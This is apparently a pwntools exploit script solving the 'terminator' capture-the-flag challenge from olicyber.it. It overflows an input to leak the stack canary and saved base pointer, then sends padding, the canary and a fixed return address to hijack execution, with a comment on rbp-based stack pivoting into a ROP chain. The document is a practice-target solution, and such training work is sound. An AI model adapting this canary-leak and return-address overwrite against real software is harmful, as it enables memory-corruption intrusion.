from pwn import *

if args.REMOTE:
  r = remote("terminator.challs.olicyber.it", 10307)
else:
  r = gdb.debug("./terminator", """
    b
    continue
  """)
  
r.recvuntil(b"> ")
r.sendline(b"a"*55)
r.recvuntil(b'\n\n')
tmp = r.recvuntil(b"Nice to meet you!")[:-17]
canary = tmp[:8]
rbp = tmp[8:]

print(canary, ' '+str(len(canary)))
print(rbp, ' '+str(len(rbp)))

r.sendline(b'a'*56 + canary + p64(0x401162))
#you can use the rbp to overwrite the return address, because when you overwrite the rbp and then leave and ret, the return address will be the value of the rbp, consequently causing a rop chain
r.interactive()